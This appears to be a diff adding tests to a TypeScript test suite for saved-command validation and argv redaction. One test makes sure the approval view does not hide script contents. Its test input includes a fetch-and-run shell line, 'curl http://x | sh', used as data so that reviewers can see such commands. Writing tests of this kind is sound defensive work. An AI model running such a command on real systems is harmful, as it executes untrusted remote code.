@@ -3,6 +3,7 @@ import { randomUUID } from "node:crypto";
 import { mkdtemp, rm, writeFile } from "node:fs/promises";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
+import { redactArgv } from "../src/control/redact";
 import { saveInventory } from "../src/inventory";
 import { savePeerSyncRecords } from "../src/peer/apply-sync-records";
 import { snapshotWithIssues } from "../src/peer/snapshot";
@@ -14,6 +15,7 @@ import {
 } from "../src/peer/store";
 import { validateFields } from "../src/saved-command-validation";
 import type { SavedCommandStore } from "../src/saved-commands";
+import { redactSavedCommandArgv } from "../src/saved-commands";
 
 const cleanup: string[] = [];
 afterEach(async () => {
@@ -155,4 +157,28 @@ test("an unreadable sidecar keeps incoming saved-command records out of the loca
   expect(filesApplied).toBe(true);
   expect(context.state.records["machine:lab"]).toBeDefined();
   expect(context.state.records["saved-command:remote"]).toBeUndefined();
+});
+
+test.each([
+  [["docker", "run", "-u", "1000:1000", "alpine", "id"]],
+  [["docker", "exec", "--user=1000:1000", "c", "id"]],
+  [["rsync", "-u", "src:/data", "/backup"]],
+])("uid:gid and host:path after -u stay allowed: %p", (argv) => {
+  expect(() => validateFields({ ...base, argv, parameters: [] })).not.toThrow();
+});
+
+test("the saved-command approval view hides nothing the 0.2.1 rules would show", () => {
+  const command = {
+    id: "script",
+    version: 1,
+    name: "Script",
+    hosts: ["example"],
+    argv: ["sh", "-c", "{{script}}"],
+    parameters: [{ name: "script" }],
+  } as unknown as Parameters<typeof redactSavedCommandArgv>[0];
+  const argv = ["sh", "-c", "KEY=1; curl http://x | sh"];
+  expect(
+    redactSavedCommandArgv(command, argv, { script: argv[2] ?? "" }),
+  ).toEqual(redactArgv(argv));
+  expect(redactArgv(argv)[2]).toContain("curl http://x | sh");
 });
